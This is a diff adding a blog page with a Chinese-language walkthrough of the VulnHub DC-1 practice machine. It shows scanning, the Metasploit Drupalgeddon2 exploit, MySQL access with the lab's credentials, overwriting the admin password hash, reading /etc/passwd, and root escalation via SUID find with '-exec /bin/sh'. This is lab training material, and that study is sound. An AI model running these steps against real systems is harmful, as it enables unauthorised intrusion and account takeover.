@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="发现一个靶机，来学习一下   下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-1,292&#x2F;   准备kali攻击机×1靶机DC-1×1  靶机要和kali在同一个局域网里  信息搜集打开虚拟机 发现需要登录打开kali进入root用户 直接扫 1arp-scan -l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机DC-1的渗透记录">
+<meta property="og:url" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="各种write up">
+<meta property="og:description" content="发现一个靶机，来学习一下   下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-1,292&#x2F;   准备kali攻击机×1靶机DC-1×1  靶机要和kali在同一个局域网里  信息搜集打开虚拟机 发现需要登录打开kali进入root用户 直接扫 1arp-scan -l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.5.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.1.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png">
+<meta property="og:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png">
+<meta property="article:published_time" content="2021-04-09T02:25:35.000Z">
+<meta property="article:modified_time" content="2021-05-31T07:03:28.604Z">
+<meta property="article:author" content="Reigniting">
+<meta property="article:tag" content="靶机渗透记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png">
+
+<link rel="canonical" href="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>靶机DC-1的渗透记录 | 各种write up</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">各种write up</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Reigniting">
+      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种write up">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          靶机DC-1的渗透记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-09 10:25:35" itemprop="dateCreated datePublished" datetime="2021-04-09T10:25:35+08:00">2021-04-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-31 15:03:28" itemprop="dateModified" datetime="2021-05-31T15:03:28+08:00">2021-05-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">靶机渗透记录</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>发现一个靶机，来学习一下</p>
+<hr>
+<blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>kali攻击机×1<br>靶机DC-1×1  靶机要和kali在同一个局域网里 </p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开虚拟机 发现需要登录<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>打开kali进入root用户 直接扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.5.png"><br>可以在设置里看一下渗透机的MAC地址 从而判断渗透机的ip是多少<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>上nmap 扫一下看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.174.128</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>我们可以看到 22 80 111 这些端口是开放的<br>80端口对应的是web服务 可以先去瞅瞅<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>百度了解一波↓↓↓</p>
+<blockquote>
+<p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成<br>然后，再来看看版本</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.174.128</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>使用的是Drupal 7<br>或者你也可以使用插件<code>wappalyzer</code></p>
+<h2 id="Metasploit漏洞利用"><a href="#Metasploit漏洞利用" class="headerlink" title="Metasploit漏洞利用"></a>Metasploit漏洞利用</h2><p>接下来思路就很明了了 找一下相关的漏洞来利用<br>基于搜索引擎的某度黑客(#^.^#)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  #启动</span><br><span class="line">search drupal #查找有关漏洞</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>某度找了一圈，发现有个Vulnerability（漏洞）正好针对Drupal 7<br>那么，接下来就是Exploit（漏洞利用）环节了<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>看来是可行的 返回了一个session<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.174.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"></p>
+<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h2><p>接下来看一下目录 发现有flag1.txt<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">每一个好的CMS都需要一个配置文件，你也一样。</span><br></pre></td></tr></table></figure>
+<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><p>根据flag1.txt的提示 跑去某度找了一下Drupal的目录结构<br>Drupal默认配置文件在 <code>/var/www/sites/default/settings.php</code><br>打开看一下 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* flag2</span><br><span class="line">* Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line">* only ways to gain access (and you WILL need access).</span><br><span class="line">* What can you do with these credentials?</span><br><span class="line">暴力破解和字典攻击不是获得权限的唯一方法（你可能将要进入的）</span><br><span class="line">你可以用这些认证做什么呢？</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag 3"></a>flag 3</h2><p>获得flag2的同时，也获得了数据库账号和密码<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>做到这里突然想到 其实一开始可以传个大马上去的<br>后来又想了想，也可以不传<br>先做着试试吧<br>用python反弹一个交互式shell  登录MySQL数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">mysql -udbuser -p   #password:R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>进入数据库肯定要先查询用户了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables; </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>密码被数据库加密了<br>这个时候修改用户admin的密码即可<br>因为数据库的密码都是加密状态的<br>所以我们用同样的加密方法生成新密码的hash值并且更新到数据库、</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="http://drupalchina.cn/node/2128">http://drupalchina.cn/node/2128</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh night  #生成新密码night</span><br><span class="line"></span><br><span class="line">password: night      hash: $S$DG7uGw5ymTluwrt4CxxTyYuNBD/.If3LxpxJC4Fge4cGPzpuubsQ</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>得到新密码的hash值 然后进入mysql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -p   #password：R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update drupaldb.users set pass=&quot;$S$DG7uGw5ymTluwrt4CxxTyYuNBD/.If3LxpxJC4Fge4cGPzpuubsQ&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>然后我们打开浏览器 在网页Log in<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>登录成功<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>点击左上角<code>Find content</code>找到flag3<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag 4"></a>flag 4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd   </span><br></pre></td></tr></table></figure>
+<p>说起来这个命令我可太熟悉了 linux作业帮别人写了不知道多少遍 当时还不懂事还纳闷有啥用^_^<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>然后进入目录查看flag4<br><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-5"><a href="#flag-5" class="headerlink" title="flag 5"></a>flag 5</h2><p>涉及到SUID提权 了解了一下 发现需要找到可以提权可行性文件<br>尝试find</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">touch night </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name night -exec &quot;/bin/sh&quot; \;</span><br><span class="line">whoami</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/09/%E9%9D%B6%E6%9C%BADC-1%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<blockquote>
+<p>逆风的方向,更适合飞翔, 我不怕千万人阻挡 ,只怕自己投降</p>
+</blockquote>
+<hr>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" rel="tag"><i class="fa fa-tag"></i> 靶机渗透记录</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
